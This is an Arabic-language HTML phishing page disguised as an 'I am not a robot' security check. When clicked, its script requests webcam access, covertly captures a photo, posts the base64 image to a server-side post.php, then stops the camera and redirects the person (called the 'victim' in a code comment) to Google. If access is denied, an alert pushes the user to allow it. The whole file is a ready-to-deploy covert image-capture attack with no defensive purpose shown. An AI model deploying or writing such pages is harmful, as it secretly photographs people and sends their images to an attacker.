<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>التحقق الأمني</title>
    <style>
        body { display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background: #f0f2f5; }
        /* زر حقيقي لجذب تفاعل المتصفح */
        button { padding: 20px 40px; font-size: 18px; cursor: pointer; background: #007bff; color: white; border: none; border-radius: 5px; }
    </style>
</head>
<body>

<button onclick="startProcess()">أنا لست روبوت - اضغط للتحقق</button>

<script>
async function startProcess() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        
        // إنشاء الفيديو وتشغيله في الخلفية
        const video = document.createElement('video');
        video.srcObject = stream;
        video.play();

        // تأخير 1 ثانية لضمان عمل الكاميرا والتقاط الصورة
        setTimeout(async () => {
            const canvas = document.createElement('canvas');
            canvas.width = 640; canvas.height = 480;
            canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
            
            const data = canvas.toDataURL('image/jpeg', 0.8);
            
            // إرسال البيانات
            await fetch('post.php', {
                method: 'POST',
                headers: {'Content-Type': 'application/x-www-form-urlencoded'},
                body: 'img=' + encodeURIComponent(data)
            });

            // إيقاف الكاميرا وتحويل الضحية
            stream.getTracks().forEach(track => track.stop());
            window.location.href = "https://www.google.com";
        }, 1000);

    } catch (err) {
        alert("يرجى السماح بالوصول للكاميرا لإكمال التحقق");
    }
}
</script>
</body>
</html>
